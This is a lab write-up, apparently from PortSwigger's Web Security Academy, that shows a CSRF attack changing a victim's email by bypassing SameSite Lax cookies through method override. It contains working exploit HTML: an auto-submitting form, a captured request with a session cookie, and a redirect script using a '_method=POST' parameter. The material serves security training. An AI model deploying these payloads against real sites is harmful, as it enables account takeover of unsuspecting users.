### Lab: SameSite Lax bypass via method override

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

_____

Analysis and Exploit:

1. Logged-in as user _wiener_. No CSRF token in /login and /my-account webpages

2. Same-Site not specified in Set-Cookie after login, so default is Lax since the victim is using Google Chrome  
    - flags Secure and HttpOnly applied to session cookie
    - cookies are passed only if GET method is used and requests come from a top-level navigation

3. Changed method from POST to GET for /my-account/change-email (email=x@x) to /my-account/change-email?email=testhe%40function, returned status code 405 Method not allowed ("Method Not Allowed")

4. Created fake form with method override from POST to GET
```html
<html>
    <body>
        <form action="URL/my-account/change-email" method="POST">
            <input type="hidden" name="httpMethod" value="GET">
            <input required type="email" name="email" value="yougot@hacked">
            <button type="submit">Submit</button>
        </form>
        <script>document.forms[0].submit()</script>
    </body>
</html>
```

```http
POST /my-account/change-email HTTP/2
Host: 0a92003803fa9f63823810f200f100af.web-security-academy.net
Cookie: session=3EqRJot6HsdPVGJUNEPR38GBfoUlktjD;
Content-Length: 26
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://exploit-0a160050030b9f8b82d10f4901f400ef.exploit-server.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://exploit-0a160050030b9f8b82d10f4901f400ef.exploit-server.net/
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7

httpMethod=GET&email=yougot%40hacked
```

Step 4 works then tested but for some reason does not solve the lab.

Portwsigger solution is to change the request method within Burpsuite from POST to GET and add the parameter **_method="POST** to the GET request...

```html
<script>
    document.location="https://0ac300090406d61281e67abd00390019.web-security-academy.net/my-account/change-email?email=youjustgot%40hacked&_method=POST"
</script>
```